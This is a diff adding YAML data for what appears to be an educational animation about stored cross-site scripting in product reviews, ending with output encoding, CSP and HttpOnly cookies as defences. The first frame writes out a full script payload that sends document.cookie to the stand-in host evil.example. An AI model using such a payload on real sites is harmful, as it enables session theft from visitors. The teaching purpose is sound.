@@ -1,0 +1,26 @@
+title: A product review that steals sessions
+legend:
+  accent: 'attacker input'
+  bad: 'runs as code'
+  ok: 'shown as text'
+frames:
+  - caption: 'An attacker posts a review. Instead of text, it contains a script that sends whatever it can reach to the attacker''s server.'
+    panels:
+      - kind: kv
+        label: Review submitted
+        pairs: [[author, 'mallory'], [text, { v: '<script>fetch(''https://evil.example/?c=''+document.cookie)</script>', tone: accent }]]
+  - caption: 'The server stores it and later builds the product page by pasting the review into the HTML. Every visitor''s browser receives the script as part of **your** page.'
+    panels:
+      - kind: flow
+        label: Product page HTML
+        items: ['<h2>Reviews</h2>', '<p>Great shoes!</p>', { v: '<p><script>fetch(…document.cookie)</script></p>', tone: bad }]
+  - caption: 'The browser can''t tell your scripts from the attacker''s. It runs it with full access to the page: it can read non-HttpOnly cookies, the page''s data and tokens, and act as the user.'
+    panels:
+      - kind: rows
+        label: In each visitor's browser
+        items: [{ v: 'reads the page and any readable cookies', tone: bad }, { v: 'sends them to evil.example', tone: bad }, { v: 'can click buttons and submit forms as the user', tone: bad }]
+  - caption: 'With output encoding, `<` becomes `&lt;` and so on: the browser shows the review''s characters on screen and never treats them as a tag. CSP with a nonce would also stop the script, and an HttpOnly session cookie would have kept the session out of reach.'
+    panels:
+      - kind: flow
+        label: Encoded HTML
+        items: ['<h2>Reviews</h2>', { v: '<p>&lt;script&gt;fetch(…)&lt;/script&gt;</p>', tone: ok }]
